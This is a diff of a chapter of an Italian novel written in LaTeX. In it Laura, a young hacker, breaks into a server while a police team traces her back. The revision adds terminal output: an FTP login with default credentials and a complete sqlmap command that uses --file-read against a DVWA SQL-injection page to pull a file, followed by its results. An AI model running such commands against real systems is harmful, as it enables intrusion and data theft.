@@ -1,75 +1,90 @@
 \chapter{Nel mirino della Polizia}
 
-Alice stringe la mano di Caterina. Chissà se tra sé sta ancora canticchiando i versi \emph{straccia vesti} che le ha scritto solo sette ore fa.\\
-Valentina non riesce a stare ferma e saltella sul cuscino con un'emozione esplosiva reattiva ai comandi parabellici impartiti dalla sorella al D.P.L.
+Alice stringe la mano di Caterina. Chissà se tra sé sta ancora canticchiando i versi  che le ha scritto solo sette ore fa.\\
+Valentina non riesce a stare ferma e saltella sul cuscino con un'emozione esplosiva reattiva ai comandi parabellici impartiti dalla sorella.
+
 
 \par\medskip
-«Bene, cambiamo arma ora.»
+«Bene, cambiamo arma. Via il grimardello e attiviamo un fucile di precisione. Possiamo sparare usando le informazioni ottenute: sbagliare non è un opzione in questa missione.»
 
 \par\medskip
-«Bene, cambiamo arma… via la pistola e attiviamo un fucile di precisione. \texttt{Ftp 35.228… -uftpuser -pftppass.}»
+Preme invio.
+\par\medskip
+\begin{terminalbox}
+laura@dpl:~ ftp 35.228.xxx.xxx
+Connected to 35.228.xxx.xxx.
+220 (vsFTPd 3.0.3)
+Name (35.228.xxx.xxx:laura): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+\end{terminalbox}
 
 \par\medskip
-Preme invio. Vediamo cosa è capace di fare.
-
-\par\medskip
-«Accesso autorizzato. I cancelli sono aperti, iniziamo l'esplorazione. \texttt{ls -l}»
-
-\par\medskip
-«Tata!»
-
-\par\medskip
-«Che succede, Vale?»\\
+«Accesso autorizzato. I cancelli sono aperti, iniziamo l'esplorazione. Massima attenzione... tutte. Abbiamo trovato un fascicolo... c'è qualcosa.»\\
+Valentina si agita vicino alla sorella: «Tata!»\\
+«Che succede, soldato?»\\
 «Niente, niente, continua.»\\
-«Ti scappa la pipì?»\\
+«Ti scappa la pipì soldato?»\\
 «No, no, la tengo!»\\
-«Brava, Vale! Vediamo un po’ cosa c’è scritto qui dentro:»
+«Brava! Adesso vediamo un po’ cosa c’è scritto qui dentro:»
 
-\par\medskip
-\emph{File principali}
+\begin{terminalbox}
+ftp> less ftpuser/readme.txt
 
-\par\medskip
-- conti esteri \texttt{/data/in/cassa.csv}\\
-- bannati \texttt{/data/war/bann.txt}\\
-- sicurezza \texttt{/etc/conf/mys.txt}\\
-- organizzazioni \texttt{/var/lib/mysql-files/flag.txt}\\
-- contatti \texttt{/data/cnt/crb.csv}
+LEGACY DATA INDEX
+Last update: 2041-09-28
+Maintainer: local-admin
+
+The following paths are still used by legacy services.
+Do not rename or move files without updating the corresponding jobs.
+
+Main files:
+
+  /data/in/cassa.csv              foreign accounts import
+  /data/war/bann.txt              banned subjects list
+  /etc/conf/mys.txt               local security configuration
+  /var/lib/mysql-files/flag.txt   registered organizations export
+  /data/cnt/crb.csv               contact records backup
+
+Notes:
+- Files under /data/in/ are read by the nightly import task.
+- Files under /data/war/ are checked before access validation.
+- /etc/conf/mys.txt is required by the old MySQL connector.
+- /var/lib/mysql-files/ is exposed only to the database service.
+- /data/cnt/ contains temporary contact exports.
+
+ftp>
+\end{terminalbox}
+
 
 \par\medskip
 «Gli hai tracciati?»\\
-«Sì. Il collegamento è da un paesino in Polonia, ma è sicuramente una falsa uscita della VPN.»
-
-\par\medskip
-«Analizza le impronte.»\\
-«Sì, lo sto facendo. Non mi scappa.»
-
-\par\medskip
+«Sì. Il collegamento è da una cittadina in Polonia, ma è sicuramente una falsa uscita della VPN.»\\
+«Analizza le impronte. Vediamo da dove arriva davvero.»\\
+«Sì, lo sto facendo. Anche se tra poco finirei il turno, forse...» non finisce la frase, il suo capitano è di un altro avviso.\\
 «Coraggio, quest'anno avremo il premio di produzione. La faremo vedere noi a quegli appendi multe del reparto droni.»\\
-«L’hai detto, capo, l’hai detto. Ecco, ci sono quasi. Ho la time zone. E non è quella polacca.»
+«Ok capo! L’hai detto. Premio di produzione! Ecco, ci sono quasi. Ho la time zone. E non è quella polacca.»
 
 \par\medskip
-Laura ha individuato la directory e il file in cui sono registrati gli eventi eversivi, o comunque non autorizzati.  
-Ovviamente non si tratta di una directory pubblica, non sono così ingenui. Un conto è un vecchio FTP, un altro sono i dati freschi per il TECS degli Stati Uniti. Quelli non puoi tenerli alla mercé degli Hacker. Comunque vediamo come procede:
-
-\par\medskip
-«Ora serve di nuovo la mia G17. Sarà un’operazione silenziosa.»\\
+«Cosa hai trovato Laura?» Caterina prova a stare al gioco, ma la voce tradisce l'emozione, ha paura di non farcela, di non riuscire a partire, anche se forse ora è attratta anche  da quello che potrebbe trovare restando.\\
+Laura mantiene la calma, non può uscire ora dal suo ruolo: «Soldato, non sei autorizzata a fare domande. Mantieni il bersaglio sotto tiro. Ho individuato la directory e il file che stavamo cercando. Lì ci dovrebbero essere  i dati freschi per il TECS, il database principale del Dipartimento per la Sicurezza Nazionale degli Stati Uniti. Aprirlo è il nostro obbiettivo. Deve essere un'operazione silenziosa.»\\
 «Ho pipì, puoi aspettare?»
-
-\par\medskip
 Laura guarda Valentina fissa negli occhi: «Operazione autorizzata, soldato. Hai 33 secondi da ora.»\\
 Il bagno non è lontano dal soggiorno, e in un attimo Valentina è di ritorno.
 
 \par\medskip
-«Acqua.»\\
+«Acqua?»\\
 «Tirata.»\\
-«Mani.»\\
-Valentina torna in bagno di corsa.
-
-\par\medskip
+«Mani?»\\
+Valentina torna in bagno e dopo pochi secondi è a rapporto:
 «Lavate.»\\
 «Bene, allora possiamo procedere.»\\
 «Che succede, Laura? Dici che ce la facciamo?»\\
-«Credo di sì, Cate. Se nessuno si mette a rompere le uova nel paniere.»
+«Credo di sì. Se nessuno si mette a rompere le uova nel paniere.»
 
 \par\medskip
 \begin{center}
@@ -77,34 +92,68 @@ Valentina torna in bagno di corsa.
 \end{center}
 
 \par\medskip
-«Capo, la combinazione di fingerprint corrisponde con un agente ostile che risulta già profilato. Il server da cui sta uscendo è già compromesso. Se mi dai pochi minuti, forse lo vedremo in diretta dalla sua webcam.»
+«Capo, la combinazione di fingerprint corrisponde con un agente ostile che risulta già profilato. Il server da cui sta uscendo è già compromesso. Se mi dai pochi minuti, forse lo vedremo in diretta dalla sua webcam.»\\
+La polizia "ha fatto i compiti" o forse Laura ha fatto il passo più lungo della gamba.
 
 \par\medskip
-La polizia sembra sapere il fatto suo… o forse Laura ha fatto il passo più lungo della gamba.
+«Tento l'accesso, silenzio assoluto:»
 
-\par\medskip
-«Facciamoci dare il file: \texttt{sqlmap --flush-session …}»
+\begin{terminalbox}
+laura@dpl:~$ sqlmap --flush-session
+-u "http://35.228.xxx.xxx/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"
+--cookie="PHPSESSID=********; security=low"
+--batch --no-cast
+--file-read="/var/lib/mysql-files/flag.txt"
+
+[INFO] GET parameter 'id' appears to be injectable
+[INFO] GET parameter 'id' is vulnerable
+[INFO] the back-end DBMS is MySQL
+[INFO] fetching file: '/var/lib/mysql-files/flag.txt'
+[INFO] local copy and remote file have the same size: 627 B
+
+files saved to:
+[*] /home/laura/.local/share/sqlmap/output/35.228.xxx.xxx/files/_var_lib_mysql-files_flag.txt
+
+laura@dpl:~$
+\end{terminalbox}
+
 
 \par\medskip
 «Ottimo, vediamo cosa c’hanno scritto dentro.»
 
-\par\medskip
-«Cos’hai trovato Laura?»\\
-«Una tabella in formato CSV.»\\
-«Ma dice \textbf{sorveglianza: Sì}! Cosa significa?»\\
-«Esattamente non lo sappiamo, ma questo file probabilmente raggiungerà il DHS tra meno di cinque minuti. Se mi autorizzi, io cambierei quel \textbf{sì} in un \textbf{no}.»
+\begin{terminalbox}
+1. Clara Whitmore | Green Force | Surveillance: Yes
+2. Thomas Hale | NO Artificial Intelligence | Surveillance: No
+3. Eleanor Price | No Vax Enthusiasts | Surveillance: Yes
+4. Margaret Collins | Animal Rights Advocates | Surveillance: No
+5. Daniel Mercer | Digital Freedom Fighters | Surveillance: Yes
+6. Rebecca Stone | Climate Action Now | Surveillance: No
+7. Hannah Reed | Anti-Surveillance League | Surveillance: Yes
+8. Arthur Bennett | Renewable Future Coalition | Surveillance: No
+9. Julia Hart | Cyber Privacy Watch | Surveillance: Yes
+10. Samuel Grant | Human Rights Front | Surveillance: No
+11. Caterina xxx | Green Force | Surveillance: Yes
+\end{terminalbox}
+\\
+«Cos’hai trovato, Laura?»\\
+«Il tuo nome.»\\
+«Ma dice \textbf{sorveglianza: sì}! Cosa significa?»\\
+«Esattamente non lo sappiamo, ma questo file probabilmente raggiungerà il DHS tra meno di cinque minuti. Se mi autorizzi, io cambierei quel \textbf{sì} in un \textbf{no}.»\\
+«Il DHS? Cosa sarebbe, Laura?»\\
+«Cate, il DHS è il Dipartimento per la Sicurezza Interna degli Stati Uniti. Raccolgono tutti i dati possibili, anche le tracce disperse dai vecchi sistemi locali, come quello che ti deve aver segnalato dopo il vostro... arresto?» A Laura scappa una risatina. «Probabilmente nessuno ce l’ha con te, ma questa informazione esiste e alla SAGA-M potrebbe non piacere. Dobbiamo correggerla prima di mezzanotte, se vogliamo dare una chance al tuo visto.»\\
+«Ho capito... va bene, spero tu non ti metta nei guai per me.»\\
+Prima che Laura possa continuare un led si accende sulla  cornice del monitor di fianco all'apertura ottica della telecamera. Si fa' seria un attimo, ma non dice nulla. Apre un secondo terminale e verifica i dispositivi connessi. Un sorriso, un comando. Invio.
+\\
 
 \par\medskip
 «Ho agganciato l’IP. Accedo alla webcam.»\\
 «Attenzione a non attivare le spie.»\\
 «Con chi credi di parlare capo?»\\
-«Dai, coraggio, siamo vicini!»
-
-\par\medskip
-Sul monitor si compone lentamente una figura, byte a byte…
-
-\par\medskip
-«Ci siamo! Sembrano più di una persona. Sono due sembrano agenti… Accidenti siamo noi… ci ha fregato!»
+«Dai, coraggio, siamo vicini!»\\
+Sul monitor della polizia si compone lentamente una figura, byte a byte.\\
+«Ci siamo! Sembrano più di una persona!»
+L'immagine mostra due persone, forse due hacker mascherati, sembrano indossare vestiti degli stessi colori. La definizione non è ancora buona, ma ogni pochi secondi
+emergono più dettagli. I due  hanno camice uguali, sembrano divise: «Sono due sembrano agenti, ma? Accidenti... Addio premio di produzione. Io chiudo capo.»
 
 \par\medskip
 «Bene, ed ora il colpo finale. Mettiamo via le armi da fuoco e passiamo all’arma bianca: \texttt{Nano --flags …}»
